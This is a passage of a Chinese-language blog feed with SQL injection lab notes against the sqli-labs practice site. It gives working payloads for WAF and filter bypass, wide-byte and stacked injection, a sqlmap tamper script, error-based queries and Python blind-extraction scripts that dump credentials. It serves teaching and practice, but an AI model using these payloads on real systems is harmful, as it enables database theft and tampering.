class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br><span class="line">如果是有以上字符则删除再执行，则使用双写或部分大写部分小写绕过</span><br><span class="line">and=anandd    or=oorr</span><br></pre></td></tr></table></figure><h4><span id="5绕过注释符号后面跟一个空格过滤">5,绕过注释符号（#，–(后面跟一个空格））过滤</span></h4><p>以单引号‘闭合为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br><span class="line">and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h4><span id="6绕过unionselectwhere等">6，绕过union，select，where等</span></h4><p><strong>（1）使用注释符绕过</strong></p><p>常用注释符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure><p><strong>（2）使用大小写绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure><p><strong>（3）内联注释绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure><p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure><h4><span id="7宽字节注入">7，.宽字节注入</span></h4><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK  编码的时候，会认为两个字符为一个汉字，一般用%df 吃掉 \ ，具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在  %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c  就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure><h4><span id="8多参数请求拆分">8，多参数请求拆分</span></h4><p>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。</p><p>例如请求URL时，GET参数格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=[input1]&amp;b=[input2]</span><br></pre></td></tr></table></figure><p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=[input1] and b=[input2]</span><br></pre></td></tr></table></figure><p>这时就可以将注入语句进行拆分，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=union/*&amp;b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure><p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=union /*and b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure><h4><span id="9http参数污染">9，HTTP参数污染</span></h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。具体如下图所示：（以参数color&#x3D;red&amp;color&#x3D;blue为例）。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282025144.jpeg" alt="img"></p><p>例如29关，就只拿到最后以为参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.55:808/sqli/Less-29/?id=1&amp;id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h4><span id="10编写使用tamper">10，编写使用tamper</span></h4><p>在做26a关时禁用了and,or,空格和注释，所有直接使用SQLmap是爆不出数据库的，所以就要使用tamper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(&#x27;and&#x27;, &#x27;anandd&#x27;)</span><br><span class="line">    payload = payload.replace(&#x27;or&#x27;, &#x27;oorr&#x27;)</span><br><span class="line">    payload = payload.replace(&#x27; &#x27;, &#x27;%0B&#x27;)</span><br><span class="line">    payload = payload.replace(&quot;#&quot;, &quot;anandd&#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    return payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上是自己编写的tamper名为sx.py作用是将SQLmap爆库时的语句中被禁用的字符替换为可用的</p><p>将sx.py放入Kali的&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;目录下</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.99:808/sqli/Less-26a/?id=1&quot; --batch -v 3 -- tamper=sx --dbs --level=5 --risk=3</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282035570.png" alt="image-20231228203552469"></p><h4><span id="11堆叠注入">11，堆叠注入</span></h4><p>存在条件：</p><p>1，目标存在sql注入漏洞</p><p>2，目标未对”;”号进行过滤</p><p>3，目标中间层查询数据库信息时可同时执行多条sql语句，例如php中mysqli_multi_query()函数</p><p>在38关，传入单引号报错,发现错误回显分析后构造单引号闭合发现字符型注入</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282043660.png" alt="image-20231228204222976"></p><p>经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.于是尝试堆叠注入将id为1的用户密码改成123,可以配合联合查询来判断sql是否执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-38/?id=-1%27%20union%20select%201,2,3;update%20users%20set%20password=123%20where%20id=1--+</span><br></pre></td></tr></table></figure><p>再次查询</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282044818.png" alt="image-20231228204329837"></p><p>已经更改，我们打开php源代码看一下，可以看到有mysqli_multi_query()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="12绕过waf">12，绕过waf</span></h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282112784.png" alt="image-20231228211209170"></p><p>说明waf已开启</p><p>使用yakit判断该waf拦截哪些字符，插入字典，进行执行</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282118151.png" alt="image-20231228211842979"></p><p>观察响应的数据包大小，发现order by 和union select两组被waf拦截</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282121196.png" alt="image-20231228212141674"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用/*//*/来代替空格</span><br><span class="line">用/*！版本号*/来包裹关键字</span><br><span class="line">在mysq中 /*!*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在 /*!*/ 中，这样这些语句如果在其他数据库中是不会被执行，但在mysal中它会执行。如下语/*!50001 select from test*/这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行。</span><br></pre></td></tr></table></figure><p>我们用yakit来测试可用的版本号</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282137417.png" alt="image-20231228213722369"></p><p>最后拼合语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,2,3-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282138940.png" alt="image-20231228213827427"></p><p>查数据库，语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,/*!00044database*//*//*//*!00044()*/,3-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282141771.png" alt="image-20231228214106412"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;目录：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;emsp;&lt;strong&gt;&amp;emsp;1，绕过空格 (注释符&amp;#x2F;* *&amp;#x2F;，%a0)&lt;/strong&gt;&lt;br&gt;        &lt;strong&gt;&amp;emsp;&amp;emsp;2，引号绕过(使用十六进制)&lt;/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十九，SQL注入</title>
    <link href="http://example.com/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2023-12-21T11:08:56.000Z</published>
    <updated>2023-12-28T11:35:46.727Z</updated>
    
    <content type="html"><![CDATA[<p><strong>目录：</strong></p><p>&emsp;&emsp; <strong>SQL注入的危害:</strong><br>&emsp;&emsp; <strong>MySQL数据库5.0上下的区别:</strong><br>&emsp;&emsp; <strong>SQL注入的步骤，以sqli练习网站为例:</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>1，使用‘，”，),or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>2，使用order by 来判断返回列数</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>3，运用union联合查询来判断回显数据的位置</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>4，获取数据库版本和当前查询的数据库的名称</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>5，根据以上获取的信息，拿到当前数据库下的所有表的名称</strong></p><p>&emsp;&emsp;&emsp;&emsp;<strong>6，查询某一张表中的列名，以users表为例</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>7，获取某一张表的所有数据</strong><br>&emsp;&emsp;<strong>报错注入用Postman进行注入基于布尔的盲注</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>1，判断数据库类型</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>2，判断当前数据库名</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>3，判断当前库的表名</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>4，判断表的字段</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>5，爆字段中的数据</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>6,修改后的python代码</strong><br>&emsp;&emsp;<strong>基于时间的盲注</strong><br>&emsp;&emsp;<strong>二次注入</strong><br>&emsp;&emsp;<strong>基于SQL注入拿到webshell</strong><br>&emsp;&emsp;<strong>sQLmap</strong></p><p>&emsp;&emsp;SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</p><h4><span id="sql注入的危害">SQL注入的危害：</span></h4><ul><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡改。</li><li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ul><h4><span id="mysql数据库50上下的区别">MySQL数据库5.0上下的区别：</span></h4><p>​mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，是information_schema,而5.0之前的版本不存在且5.0以下的版本是多用户单操作。information_schema数据库中含有三张表（schemata、tables、columns）。这三张表中存放的字段依次为（schema_name）、（table_name,table_schema）、（table_schema,table_name,column_name）</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211921573.png" alt="image-20231221192140754"></p><p>​因此在我们进行sql注入时，当得知mysql的版本是5.0以上的就比较简单了，可以对information_schema数据库进行爆破，来获取想要知道的表、表中的数据等一些重要信息。相比较与5.0以下的版本对其进行注入的时相对来说比较麻烦，需要对数据库进行暴力破解的方式，来爆破其中的敏感数据库，表等信息。</p><h4><span id="sql注入的步骤以sqli练习网站为例">SQL注入的步骤，以sqli练习网站为例：</span></h4><p>以下示例为get请求方式，post请求同理</p><h5><span id="1使用-or-1x3d1x2f1x3d2等来判断是否能进行注入以及闭合">1，使用 <em>‘</em>，*)*,<em>or 1&#x3D;1&#x2F;1&#x3D;2</em>等来判断是否能进行注入以及闭合</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211933872.png" alt="image-20231221193313081"></p><p>在上图中根据输入的id&#x3D;1正常，id&#x3D;1’报错和SQL回显的报错语句可判断是这是一个字符型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211935391.png" alt="image-20231221193530070"></p><p>在1‘后加入– -表示将后面的内容都注释掉，运行后正常表示判断正确</p><h5><span id="2使用order-by-来判断返回列数">2，使用order by 来判断返回列数</span></h5><p>order by是根据第n列来进行排序，设定不存在的列则会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ order by 4 -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211939882.png" alt="image-20231221193936858"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211940402.png" alt="image-20231221194019357"></p><p>根据上图order by 4正常显示,order by 5报错，判断出返回的是4列数据</p><h5><span id="3运用union联合查询来判断回显数据的位置">3，运用union联合查询来判断回显数据的位置</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0’ union select 1,2,3,4 -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211946412.png" alt="image-20231221194258141"></p><p>根据select 1，2，3，4判断出页面上会显示出第2，3列的数据，之后将查询语句和数据放在这两个位置上</p><h5><span id="4获取数据库版本和当前查询的数据库的名称">4，获取数据库版本和当前查询的数据库的名称</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ union select 1,batase(),version()，4 -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211946389.png" alt="image-20231221194617105"></p><p>根据SQL自带的函数database（），version（）可以很容易的拿到当前数据库名和版本信息</p><p>看到版本为5.7.26大于5，则之后可以用自带的系统数据库information_schema来查询我们想要的信息</p><p>以下是常用的SQL函数</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211949974.png" alt="image-20231221194905883"></p><h5><span id="5根据以上获取的信息拿到当前数据库下的所有表的名称">5，根据以上获取的信息，拿到当前数据库下的所有表的名称</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211958842.png" alt="image-20231221195846821"></p><p>其中union是联合查询，group_concat(table_name)会将其中查到的内容用逗号分隔，information_schema.tables是MySQL5.0以上系统自带的数据库中存放所有表名称的表，where table_schema&#x3D;’security’指定表所在的数据库为security，是上一步所查询出的数据库名称</p><p>根据上图可以看出security数据库中有comments,emails,referers,uagents,users五张表</p><h5><span id="6查询某一张表中的列名以users表为例">6，查询某一张表中的列名，以users表为例</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(column_name) ,3 ,4 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212007963.png" alt="image-20231221200736740"></p><p>根据查询结果可以看出users表有id,username,password,isadm四个字段</p><h5><span id="7获取某一张表的所有数据">7，获取某一张表的所有数据</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id= -1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password,&quot;~&quot;,isadm),3 ,4 from users;-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212015445.png" alt="image-20231221201525346"></p><h4><span id="报错注入">报错注入</span></h4><p>​报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p><p>以下是构造好的常用语句，在参数后加and，再将以下语句加入修改参数就可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br><span class="line">exp:5.5-5.6</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212032354.png" alt="image-20231221203250121"></p><p>这样就可以看到当前用户了，也可以修改参数，查看当前数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212034136.png" alt="image-20231221203443056"></p><h4><span id="用postman进行注入">用Postman进行注入</span></h4><p>有些页面不能展现所有的返回数据，并且在浏览器的地址栏也不能进行post请求，所以可以使用软件postman来进行这些操作，方便好用。</p><p>在浏览器打开开发者工具，找到网络，清空后点击页面请求api的按钮，看到响应是json数据的一般就是api接口了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212040039.png" alt="image-20231221204026429"></p><h4><span id="基于布尔的盲注">基于布尔的盲注</span></h4><p>​布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p><p>我们输入正确的id，显示You are in …..</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212048262.png" alt="image-20231221204838365"></p><p>我们输入错误的语句如id&#x3D;1’ ，或者id&#x3D;-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212049759.png" alt="image-20231221204903839"></p><p>构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212050940.png" alt="image-20231221205004587"></p><p>用python脚本来判断当前的数据库名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id=1&#x27;and ascii(substring(database(),1,1))=115--+</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tr=<span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://192.168.2.70/sqli/Less-8/?id=1&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">        url=url1+<span class="string">&quot; &#x27; and ascii(substring(database(),&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;,1))= &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-- -&quot;</span></span><br><span class="line">        response= requests.get(url)</span><br><span class="line">        con=response.text</span><br><span class="line">        <span class="keyword">if</span> tr <span class="keyword">in</span> con:</span><br><span class="line">            name=name+<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212055979.png" alt="image-20231221205522722"></p><p>将上述代码修改为二分法的写法，执行速度会更快</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.59/sqli/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        begin =<span class="number">32</span></span><br><span class="line">        end =<span class="number">128</span></span><br><span class="line">        tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end :</span><br><span class="line">            paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">db()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212100012.png" alt="image-20231221210042984"></p><p>以下是盲注的一些常用语法：</p><h5><span id="1判断数据库类型">1，判断数据库类型</span></h5><pre><code>MySQL数据库表      information_schema.tablesaccess            msysobjects SQLServer         sysobjects</code></pre><p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="line">//判断是否是 access数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+</span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+</span><br></pre></td></tr></table></figure><h5><span id="2判断当前数据库名">2，判断当前数据库名</span></h5><figure class="highlight 